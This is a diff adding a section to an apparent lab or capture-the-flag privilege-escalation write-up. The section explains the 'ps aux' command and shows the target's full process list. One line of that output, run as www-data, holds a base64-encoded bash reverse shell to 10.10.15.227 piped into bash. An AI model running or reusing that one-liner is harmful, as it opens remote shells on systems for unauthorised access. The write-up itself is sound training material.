@@ -1894,6 +1894,270 @@ Every binary in this list is a standard Ubuntu system binary — none are custom
 </div>
 
 ### 5.3 Check running processes
+
+**Command:** `ps aux`
+
+**Breakdown:**
+
+- `a`
+    - **Description:** Shows processes from all users, not just the current user.
+    - **Purpose:** Gives a complete picture of everything running on the system, including processes owned by root that we might be able to interact with.
+- `u`
+    - **Description:** Displays output in user-oriented format, including the owning username, CPU, and memory usage.
+    - **Purpose:** Makes it immediately visible which processes are running as root versus other users.
+- `x`
+    - **Description:** Includes processes not attached to a terminal.
+    - **Purpose:** Captures background daemons and services — exactly the kind of processes most likely to offer a privilege escalation path.
+
+**Result (key processes highlighted):**
+```shell
+ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.3  22484 13640 ?        Ss   Jun30   0:04 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    Jun30   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        S    Jun30   0:00 [pool_workqueue_release]
+root           4  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-rcu_g]
+root           5  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-rcu_p]
+root           6  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-slub_]
+root           7  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-netns]
+root          11  0.0  0.0      0     0 ?        I    Jun30   0:00 [kworker/u4:0-ipv6_addrconf]
+root          12  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mm_pe]
+root          13  0.0  0.0      0     0 ?        I    Jun30   0:00 [rcu_tasks_kthread]
+root          14  0.0  0.0      0     0 ?        I    Jun30   0:00 [rcu_tasks_rude_kthread]
+root          15  0.0  0.0      0     0 ?        I    Jun30   0:00 [rcu_tasks_trace_kthread]
+root          16  0.0  0.0      0     0 ?        S    Jun30   0:00 [ksoftirqd/0]
+root          17  0.0  0.0      0     0 ?        I    Jun30   0:07 [rcu_preempt]
+root          18  0.0  0.0      0     0 ?        S    Jun30   0:00 [migration/0]
+root          19  0.0  0.0      0     0 ?        S    Jun30   0:00 [idle_inject/0]
+root          20  0.0  0.0      0     0 ?        S    Jun30   0:00 [cpuhp/0]
+root          21  0.0  0.0      0     0 ?        S    Jun30   0:00 [cpuhp/1]
+root          22  0.0  0.0      0     0 ?        S    Jun30   0:00 [idle_inject/1]
+root          23  0.0  0.0      0     0 ?        S    Jun30   0:00 [migration/1]
+root          24  0.0  0.0      0     0 ?        R    Jun30   0:00 [ksoftirqd/1]
+root          26  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/1:0H-events_highpri]
+root          29  0.0  0.0      0     0 ?        S    Jun30   0:00 [kdevtmpfs]
+root          30  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-inet_]
+root          31  0.0  0.0      0     0 ?        S    Jun30   0:00 [kauditd]
+root          32  0.0  0.0      0     0 ?        S    Jun30   0:00 [khungtaskd]
+root          33  0.0  0.0      0     0 ?        S    Jun30   0:00 [oom_reaper]
+root          35  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-write]
+root          37  0.0  0.0      0     0 ?        S    Jun30   0:01 [kcompactd0]
+root          38  0.0  0.0      0     0 ?        SN   Jun30   0:00 [ksmd]
+root          40  0.0  0.0      0     0 ?        SN   Jun30   0:00 [khugepaged]
+root          41  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kinte]
+root          42  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kbloc]
+root          43  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-blkcg]
+root          44  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/9-acpi]
+root          45  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-tpm_d]
+root          46  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ata_s]
+root          47  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-md]
+root          48  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-md_bi]
+root          49  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-edac-]
+root          50  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-devfr]
+root          51  0.0  0.0      0     0 ?        S    Jun30   0:00 [watchdogd]
+root          52  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-quota]
+root          54  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/1:1H-kblockd]
+root          55  0.0  0.0      0     0 ?        S    Jun30   0:00 [kswapd0]
+root          56  0.0  0.0      0     0 ?        S    Jun30   0:00 [ecryptfs-kthread]
+root          57  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kthro]
+root          58  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/24-pciehp]
+root          59  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/25-pciehp]
+root          60  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/26-pciehp]
+root          61  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/27-pciehp]
+root          62  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/28-pciehp]
+root          63  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/29-pciehp]
+root          64  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/30-pciehp]
+root          65  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/31-pciehp]
+root          66  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/32-pciehp]
+root          67  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/33-pciehp]
+root          68  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/34-pciehp]
+root          69  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/35-pciehp]
+root          70  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/36-pciehp]
+root          71  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/37-pciehp]
+root          72  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/38-pciehp]
+root          73  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/39-pciehp]
+root          74  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/40-pciehp]
+root          75  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/41-pciehp]
+root          76  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/42-pciehp]
+root          77  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/43-pciehp]
+root          78  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/44-pciehp]
+root          79  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/45-pciehp]
+root          80  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/46-pciehp]
+root          81  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/47-pciehp]
+root          82  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/48-pciehp]
+root          83  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/49-pciehp]
+root          84  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/50-pciehp]
+root          85  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/51-pciehp]
+root          86  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/52-pciehp]
+root          87  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/53-pciehp]
+root          88  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/54-pciehp]
+root          89  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/55-pciehp]
+root          90  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-acpi_]
+root          92  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_0]
+root          93  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root          94  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_1]
+root          95  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root          99  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mld]
+root         100  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ipv6_]
+root         101  0.0  0.0      0     0 ?        I    Jun30   0:00 [kworker/u4:1-ext4-rsv-conversion]
+root         108  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kstrp]
+root         110  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/u7:0]
+root         111  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/u8:0]
+root         112  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/u9:0]
+root         125  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-charg]
+root         156  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/0:1H]
+root         176  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_2]
+root         177  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         178  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_3]
+root         179  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         180  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_4]
+root         181  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         182  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_5]
+root         183  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         184  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_6]
+root         185  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         194  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_7]
+root         195  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         196  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_8]
+root         197  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         198  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_9]
+root         199  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         202  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_10]
+root         203  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         205  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_11]
+root         206  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         207  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_12]
+root         209  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         210  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_13]
+root         213  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         216  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_14]
+root         217  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         218  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_15]
+root         219  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         220  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_16]
+root         221  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         222  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_17]
+root         223  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         224  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_18]
+root         225  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         226  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_19]
+root         227  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         228  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_20]
+root         229  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         230  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_21]
+root         231  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         232  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_22]
+root         233  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         234  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_23]
+root         235  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         236  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_24]
+root         237  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         238  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_25]
+root         239  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         240  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mpt_p]
+root         241  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mpt/0]
+root         242  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_26]
+root         243  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         244  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_27]
+root         245  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         246  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_28]
+root         247  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         248  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_29]
+root         249  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         250  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_30]
+root         251  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         252  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_31]
+root         253  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         283  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_32]
+root         284  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
+root         313  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-raid5]
+root         344  0.0  0.0      0     0 ?        D    Jun30   0:01 [jbd2/sda4-8]
+root         345  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ext4-]
+root         402  0.0  0.4  50500 17396 ?        S<s  Jun30   0:03 /usr/lib/systemd/systemd-journald
+root         404  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-rpcio]
+root         405  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-xprti]
+root         469  0.0  0.2  29872  8600 ?        Ss   Jun30   0:00 /usr/lib/systemd/systemd-udevd
+root         475  0.0  0.0      0     0 ?        S    Jun30   0:00 [psimon]
+root         561  0.0  0.0      0     0 ?        S    Jun30   0:00 [jbd2/sda2-8]
+root         562  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ext4-]
+_rpc         639  0.0  0.1   7968  4072 ?        Ss   Jun30   0:00 /sbin/rpcbind -f -w
+root         647  0.0  0.0  86048  2956 ?        R<sl Jun30   0:03 /sbin/auditd
+_laurel      651  0.0  0.1  10032  6452 ?        S<   Jun30   0:04 /usr/local/sbin/laurel --config /etc/laurel/config.toml
+systemd+     653  0.0  0.3  22264 13604 ?        Ss   Jun30   0:03 /usr/lib/systemd/systemd-resolved
+systemd+     664  0.0  0.1  91028  7812 ?        Ssl  Jun30   0:02 /usr/lib/systemd/systemd-timesyncd
+root         698  0.0  0.0   5140  1660 ?        Ss   Jun30   0:00 /usr/sbin/blkmapd
+root         702  0.0  0.0   5632  3056 ?        Ss   Jun30   0:00 /usr/sbin/nfsdcld
+root         717  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/60-vmw_vmci]
+root         718  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/61-vmw_vmci]
+root         738  0.0  0.0      0     0 ?        S    Jun30   0:00 [audit_prune_tree]
+root         742  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/16-vmwgfx]
+root         750  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ttm]
+root         756  0.0  0.3  53468 12180 ?        Ss   Jun30   0:00 /usr/bin/VGAuthService
+root         758  0.1  0.2 317236 10668 ?        Ssl  Jun30   0:47 /usr/bin/vmtoolsd
+root         767  0.0  0.0   4068  3236 ?        Ss   Jun30   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+message+     804  0.0  0.1   9828  5508 ?        Ss   Jun30   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         840  0.0  0.0   5428  3504 ?        Ss   Jun30   0:00 /usr/sbin/fsidd
+root         863  0.0  0.5  32192 21320 ?        Ss   Jun30   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         874  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-crypt]
+polkitd      877  0.0  0.2 308164  8032 ?        Ssl  Jun30   0:01 /usr/lib/polkit-1/polkitd --no-debug
+root         923  0.0  0.2  18004  8804 ?        Ss   Jun30   0:01 /usr/lib/systemd/systemd-logind
+root         948  0.0  0.3 468984 13544 ?        Ssl  Jun30   0:01 /usr/libexec/udisks2/udisksd
+syslog      1042  0.0  0.1 222508  5964 ?        Ssl  Jun30   0:00 /usr/sbin/rsyslogd -n -iNONE
+root        1320  0.0  0.3 392096 12876 ?        Ssl  Jun30   0:00 /usr/sbin/ModemManager
+root        1520  0.0  0.3 1238992 15436 ?       Ssl  Jun30   0:00 /usr/local/bin/OliveTin
+root        1521  0.0  0.1   8544  4540 ?        Ss   Jun30   0:00 /usr/sbin/dovecot -F
+root        1526  0.0  0.0   6824  2860 ?        Ss   Jun30   0:00 /usr/sbin/cron -f -P
+root        1529  0.0  0.8 233244 33500 ?        Ss   Jun30   0:04 php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)
+root        1530  0.0  0.0   3008  2372 ?        Ss   Jun30   0:00 /usr/sbin/rpc.idmapd
+root        1533  0.0  0.0  43212  1916 ?        Ss   Jun30   0:00 /usr/sbin/rpc.mountd
+statd       1544  0.0  0.0   4560  2016 ?        Ss   Jun30   0:00 /usr/sbin/rpc.statd
+root        1556  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/0:2H-kblockd]
+root        1562  0.0  0.0  11296  1852 ?        Ss   Jun30   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+www-data    1563  0.0  0.1  13276  5840 ?        S    Jun30   0:00 nginx: worker process
+www-data    1564  0.0  0.1  13272  5624 ?        S    Jun30   0:00 nginx: worker process
+dovecot     1579  0.0  0.0   5024  3008 ?        S    Jun30   0:00 dovecot/anvil
+root        1580  0.0  0.0   5164  3156 ?        S    Jun30   0:00 dovecot/log
+root        1592  0.0  0.1   7696  4956 ?        S    Jun30   0:00 dovecot/config
+root        1610  0.0  0.0      0     0 ?        I    Jun30   0:00 [lockd]
+root        1611  0.0  0.0   6104  1996 tty1     Ss+  Jun30   0:00 /sbin/agetty -o -p -- \u --noclear - linux
+root        1616  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+root        1617  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+root        1618  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+root        1619  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+root        1620  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+root        1621  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+root        1622  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+root        1623  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
+www-data    1625  0.0  1.0 234276 43380 ?        S    Jun30   0:01 php-fpm: pool www
+www-data    1626  0.0  1.1 234904 46564 ?        S    Jun30   0:02 php-fpm: pool www
+mysql       1660  0.8 11.2 1787608 451096 ?      Ssl  Jun30   6:18 /usr/sbin/mysqld
+root        1910  0.0  0.1  42856  4888 ?        Ss   Jun30   0:00 /usr/lib/postfix/sbin/master -w
+postfix     1912  0.0  0.1  43344  7880 ?        S    Jun30   0:00 qmgr -l -t unix -u
+root        2230  0.0  1.1 614520 45096 ?        Ssl  Jun30   0:03 /usr/libexec/fwupd/fwupd
+root        2279  0.0  0.2 313832  8824 ?        Ssl  Jun30   0:00 /usr/libexec/upowerd
+www-data    4318  0.0  0.0   2800  1876 ?        S    08:09   0:00 sh -c -- echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash
+www-data    4321  0.0  0.0   4324  3380 ?        S    08:09   0:00 bash
+www-data    4322  0.0  0.0   4588  3948 ?        S    08:09   0:00 bash -i
+root        4373  0.1  0.0      0     0 ?        I    08:30   0:11 [kworker/0:0-cgroup_release]
+root        4432  0.0  0.0      0     0 ?        I    08:39   0:02 [kworker/1:2-events]
+www-data    4683  0.0  0.8 233948 35644 ?        S    09:57   0:00 php-fpm: pool www
+root        4745  0.0  0.0      0     0 ?        I    10:09   0:00 [kworker/u6:0-events_unbound]
+root        4777  0.0  0.0      0     0 ?        I    10:18   0:00 [kworker/u5:4-events_power_efficient]
+root        4780  0.0  0.0      0     0 ?        I    10:20   0:02 [kworker/1:0-cgroup_release]
+postfix     4794  0.0  0.1  43304  7916 ?        S    10:31   0:00 pickup -l -t unix -u -c
+root        4889  0.1  0.0      0     0 ?        I    10:50   0:04 [kworker/0:3-events]
+root        4893  0.0  0.1   6752  4532 ?        S    10:52   0:00 su haris
+root        4895  0.0  0.0      0     0 ?        S    10:52   0:00 [psimon]
+haris       4897  0.0  0.2  20304 11380 ?        Ss   10:52   0:00 /usr/lib/systemd/systemd --user
+haris       4900  0.0  0.0  21156  3564 ?        S    10:52   0:00 (sd-pam)
+haris       4911  0.0  0.0   7340  3660 ?        S    10:52   0:00 bash
+root        4916  0.0  0.0      0     0 ?        I    10:53   0:00 [kworker/u5:0-events_power_efficient]
+root        4952  0.0  0.0      0     0 ?        I    11:08   0:00 [kworker/u6:3-events_unbound]
+root        5026  0.0  0.0      0     0 ?        I    11:16   0:00 [kworker/u5:1-flush-8:0]
+root        5032  0.0  0.0      0     0 ?        I    11:17   0:00 [kworker/u6:2-events_power_efficient]
+root        5038  0.0  0.0      0     0 ?        I    11:20   0:00 [kworker/u5:2-events_power_efficient]
+haris       5043  400  0.1  11012  4552 ?        R    11:25   0:00 ps au
+```
 <div align="center">
 <br>
 <br>
